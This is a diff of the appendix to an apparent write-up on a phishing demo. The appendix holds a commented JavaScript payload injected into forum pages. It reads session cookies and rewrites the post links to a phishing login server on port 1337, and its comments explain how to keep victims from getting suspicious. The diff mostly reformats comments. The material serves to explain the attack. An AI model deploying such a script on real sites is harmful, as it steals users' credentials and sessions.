@@ -48,8 +48,6 @@ It's bad enough when you consider that a phishing attack could hand user credent
 
 ## Appendix: Commented phishing script from demo
 
-```html
-<script type = "text/javascript">
 <script type = "text/javascript">
 $(document).ready(function () {
   function getCookie(n) {
@@ -89,15 +87,19 @@ $(document).ready(function () {
   }
 
   var current_page_path = window.location.pathname;
-  // If the session ID is one we've seen before, don't replace the hyperlinks. That way the redirect to the 'login' page looks like a one-off error to the user, and we don't collect the same session ID more than once
+  // If the session ID is one we've seen before, don't replace the hyperlinks.
+  // That way the redirect to the 'login' page looks like a one-off error to
+  // the user, and we don't collect the same session ID more than once
   if (!current_page_path.includes("/post") && isNewSession()) {
-    // Only run the script on the forum home page, leave individual post pages alone
+    // Only run the script on the forum home page, leave individual post pages
+    // alone
     $("td > a").each(function(i) {
       console.log(document.cookie);
       var original_path = $(this).attr("href");
       var hostname = window.location.hostname;
       // Replace all links in the table of posts with links to the phishing site
-      // Pass along the ID of the post the user was trying to see (so we can direct them back to it after 'logging them back in')
+      // Pass along the ID of the post the user was trying to see (so we can
+      // direct them back to it after 'logging them back in')
       var new_href = "http://" + hostname + ":1337" + original_path;
       $(this).prop("href", new_href);
     });
@@ -105,4 +107,4 @@ $(document).ready(function () {
   }
 });
 // Don't forget to add a normal-looking title so people don't get suspicious!
-</script>Important announcement```
+</script>Important announcement
